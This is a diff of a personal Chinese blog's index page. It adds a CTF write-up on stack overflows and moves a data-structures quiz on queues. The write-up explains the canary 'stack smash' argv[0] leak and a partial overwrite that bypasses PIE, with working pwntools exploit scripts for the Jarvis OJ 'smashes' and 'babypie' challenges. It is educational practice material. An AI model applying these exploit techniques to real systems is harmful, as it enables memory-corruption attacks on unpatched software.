@@ -252,6 +252,222 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/22/pwn学习（7）花式栈溢出2/" itemprop="url">pwn学习（7）花式栈溢出2</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
+                2018-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
+<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
+<p>如图就是函数在开始时进行的设置“哨位”</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
+<p>这是在函数最后的检查</p>
+<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
+<p>可以看到除了程序的输出外，还额外打印了一句</p>
+<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
+</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
+<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
+{
+  __fortify_fail (&quot;stack smashing detected&quot;);
+}
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
+{
+  /* The loop is added only to keep gcc happy.  */
+  while (1)
+    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
+}
+</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
+<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
+<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
+<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
+<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
+<pre><code>from pwn import *
+#p = process(&apos;./smashes.dms&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
+flag_addr = 0x400d21
+arg0_addr = 0x7fffffffdf48
+name_addr = 0x7fffffffdd30
+payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
+
+p.recvuntil(&apos;name? &apos;)
+p.sendline(payload)
+p.recvuntil(&apos;flag: &apos;)
+p.sendline(&apos;bb&apos;)
+data = p.recv()
+log.info(data)
+</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
+<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
+<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
+<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
+<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
+<p>思路齐全，上exp喽</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+#  context.log_level = &quot;debug&quot;
+
+
+while True:
+    try:
+        io = process(&quot;./babypie.dms&quot;, timeout = 1)
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
+        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
+        canary = &apos;\0&apos; + io.recvn(7)
+        success(canary.encode(&apos;hex&apos;))
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
+
+        io.interactive()
+    except Exception as e:
+        io.close()
+        print e
+</code></pre><p>Successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1065,6 +1281,178 @@ sh.interactive()
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-队列/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/18/数据结构基础-队列/" itemprop="url">数据结构基础--队列</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="数据结构复习—队列"><a href="#数据结构复习—队列" class="headerlink" title="数据结构复习—队列"></a>数据结构复习—队列</h2><p><strong> 1-1所谓“循环队列”是指用单向循环链表或者循环数组表示的队列。 (1分)</strong></p>
+<p>可以将向量空间想象成一个圆环，它首尾相接，这样的向量就是循环向量，如果我们的队列存储在这样的结构里我们就说是循环队列，当然在编程中我们可以用单链表或者是数组来表示它，但却不能划上等号</p>
+<p><strong>1-2在用数组表示的循环队列中，front值一定小于等于rear值。 (1分)</strong></p>
+<p>在循环队列中，front的值和rear的值有三种情况</p>
+<ul>
+<li>front的值小于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-219fb91ec9d6ec4b.png?imageMogr2/auto-orient/" alt=""></li>
+<li>front的值等于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-b177be6bcccd0238.png?imageMogr2/auto-orient/" alt=""></li>
+<li>front的值大于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-756e097236623702.png?imageMogr2/auto-orient/" alt=""></li>
+</ul>
+<p><strong>1-3不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。 (2分)</strong></p>
+<p>这一点不用多说，在顺序存储结构中存储的容量是一定的，一定要考虑溢出的情况</p>
+<p><strong>2-1为解决计算机主机与打印机之间速度不匹配问题，通常设置一个打印数据缓冲区，主机将要输出的数据依次写入该缓冲区，而打印机则依次从该缓冲区中取出数据。该缓冲区的逻辑结构应该是？ (1分)</strong></p>
+<p>答案应为 <em>队列</em> ，由于打印机的缓冲区要做的是“先进来的先打印”这样一个操作逻辑，自然需要我们 <em>先进先出</em> 的队列来实现了</p>
+<p><strong>2-2若已知一队列用单向链表表示，该单向链表的当前状态（含3个对象）是：1->2->3，其中x->y表示x的下一节点是y。此时，如果将对象4入队，然后队列头的对象出队，则单向链表的状态是： (1分)</strong></p>
+<p>答案应为 <em>2->3->4</em> ，因为1是对头，3是队尾，当4入队后排在4后 变为队尾，1排队成功出队，2变为队头</p>
+<p><strong>2-3在一个链队列中，front和rear分别为头指针和尾指针，则插入一个结点s的操作为（ ）。 (2分)</strong></p>
+<p>答案应为 <em>rear->next=s;rear=s;</em> ，因为插入结点，所以rear的next应该是s，但s一旦入队s就变成了队尾，所以紧接着rear=s</p>
+<p>**2-4依次在初始为空的队列中插入元素a,b,c,d以后，紧接着做了两次删除操作，此时的队头元素是（ ）。 (2分)</p>
+<p>答案应为 <em>c</em> ，还是因为队列是 <em>先进先出</em> 的，所以a、b先进来，a、b先出去</p>
+<p><strong>2-5在一个不带头结点的非空链式队列中,假设f和r分别为队头和队尾指针,则插入s所指的结点运算是( )。 (2分)</strong></p>
+<p>答案应为 <em>r->next=s; r=s;</em> ，解析和第三题相同，在这里有没有头结点关系不大</p>
+<p><strong>2-6若用大小为6的数组来实现循环队列，且当前front和rear的值分别为0和4。当从队列中删除两个元素，再加入两个元素后，front和rear的值分别为多少？ (2分)</strong></p>
+<p>答案为 <em>2和6</em> ，当删除两个元素时，front+2，而当加入两个元素时，rear+2</p>
+<p>**2-7如果循环队列用大小为m的数组表示，且用队头指针front和队列元素个数size代替一般循环队列中的front和rear指针来表示队列的范围，那么这样的循环队列可以容纳的元素个数最多为： (2分)</p>
+<p>答案应为 <em>m</em> ，因为队列有m个时，一旦循环起来我们会遇到front和rear相等的情况，而我们没有办法判断到底是队列为空还是队列已满，根本原因是 <em>我们的队列有m+1种情况，而我们只有m种状态</em> ，所以我们可以用两种方法避免：</p>
+<ul>
+<li>size进行标记判断是否队列已满</li>
+<li>只保存m-1个值，那队列就只有m中状态，恰好可以表示完全</li>
+</ul>
+<p><strong>2-8如果循环队列用大小为m的数组表示，队头位置为front、队列元素个数为size，那么队尾元素位置rear为： (2分)</strong></p>
+<p>答案应为 <em>(front+size-1)%m</em> ，公式，很好想，背下来就好了</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-链表/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1224,178 +1612,6 @@ sh.interactive()
 <p>答案是<em>head==NULL</em>，之前说过带表头的，那不带表头的也就是第一个结点是头，那为空的条件也就是头为NULL呗</p>
 <p><strong>可以用带表头附加结点的链表表示线性表，也可以用不带头结点的链表表示线性表，前者最主要的好处是（）。</strong></p>
 <p>答案为<em>使空表和非空表的处理统一</em>，说白了就是方便</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-队列/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/数据结构基础-队列/" itemprop="url">数据结构基础--队列</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/数据结构/" itemprop="url" rel="index">
-                    <span itemprop="name">数据结构</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="数据结构复习—队列"><a href="#数据结构复习—队列" class="headerlink" title="数据结构复习—队列"></a>数据结构复习—队列</h2><p><strong> 1-1所谓“循环队列”是指用单向循环链表或者循环数组表示的队列。 (1分)</strong></p>
-<p>可以将向量空间想象成一个圆环，它首尾相接，这样的向量就是循环向量，如果我们的队列存储在这样的结构里我们就说是循环队列，当然在编程中我们可以用单链表或者是数组来表示它，但却不能划上等号</p>
-<p><strong>1-2在用数组表示的循环队列中，front值一定小于等于rear值。 (1分)</strong></p>
-<p>在循环队列中，front的值和rear的值有三种情况</p>
-<ul>
-<li>front的值小于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-219fb91ec9d6ec4b.png?imageMogr2/auto-orient/" alt=""></li>
-<li>front的值等于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-b177be6bcccd0238.png?imageMogr2/auto-orient/" alt=""></li>
-<li>front的值大于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-756e097236623702.png?imageMogr2/auto-orient/" alt=""></li>
-</ul>
-<p><strong>1-3不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。 (2分)</strong></p>
-<p>这一点不用多说，在顺序存储结构中存储的容量是一定的，一定要考虑溢出的情况</p>
-<p><strong>2-1为解决计算机主机与打印机之间速度不匹配问题，通常设置一个打印数据缓冲区，主机将要输出的数据依次写入该缓冲区，而打印机则依次从该缓冲区中取出数据。该缓冲区的逻辑结构应该是？ (1分)</strong></p>
-<p>答案应为 <em>队列</em> ，由于打印机的缓冲区要做的是“先进来的先打印”这样一个操作逻辑，自然需要我们 <em>先进先出</em> 的队列来实现了</p>
-<p><strong>2-2若已知一队列用单向链表表示，该单向链表的当前状态（含3个对象）是：1->2->3，其中x->y表示x的下一节点是y。此时，如果将对象4入队，然后队列头的对象出队，则单向链表的状态是： (1分)</strong></p>
-<p>答案应为 <em>2->3->4</em> ，因为1是对头，3是队尾，当4入队后排在4后 变为队尾，1排队成功出队，2变为队头</p>
-<p><strong>2-3在一个链队列中，front和rear分别为头指针和尾指针，则插入一个结点s的操作为（ ）。 (2分)</strong></p>
-<p>答案应为 <em>rear->next=s;rear=s;</em> ，因为插入结点，所以rear的next应该是s，但s一旦入队s就变成了队尾，所以紧接着rear=s</p>
-<p>**2-4依次在初始为空的队列中插入元素a,b,c,d以后，紧接着做了两次删除操作，此时的队头元素是（ ）。 (2分)</p>
-<p>答案应为 <em>c</em> ，还是因为队列是 <em>先进先出</em> 的，所以a、b先进来，a、b先出去</p>
-<p><strong>2-5在一个不带头结点的非空链式队列中,假设f和r分别为队头和队尾指针,则插入s所指的结点运算是( )。 (2分)</strong></p>
-<p>答案应为 <em>r->next=s; r=s;</em> ，解析和第三题相同，在这里有没有头结点关系不大</p>
-<p><strong>2-6若用大小为6的数组来实现循环队列，且当前front和rear的值分别为0和4。当从队列中删除两个元素，再加入两个元素后，front和rear的值分别为多少？ (2分)</strong></p>
-<p>答案为 <em>2和6</em> ，当删除两个元素时，front+2，而当加入两个元素时，rear+2</p>
-<p>**2-7如果循环队列用大小为m的数组表示，且用队头指针front和队列元素个数size代替一般循环队列中的front和rear指针来表示队列的范围，那么这样的循环队列可以容纳的元素个数最多为： (2分)</p>
-<p>答案应为 <em>m</em> ，因为队列有m个时，一旦循环起来我们会遇到front和rear相等的情况，而我们没有办法判断到底是队列为空还是队列已满，根本原因是 <em>我们的队列有m+1种情况，而我们只有m种状态</em> ，所以我们可以用两种方法避免：</p>
-<ul>
-<li>size进行标记判断是否队列已满</li>
-<li>只保存m-1个值，那队列就只有m中状态，恰好可以表示完全</li>
-</ul>
-<p><strong>2-8如果循环队列用大小为m的数组表示，队头位置为front、队列元素个数为size，那么队尾元素位置rear为： (2分)</strong></p>
-<p>答案应为 <em>(front+size-1)%m</em> ，公式，很好想，背下来就好了</p>
 
           
         
@@ -2045,7 +2261,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2056,7 +2272,7 @@ p.interactive()
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
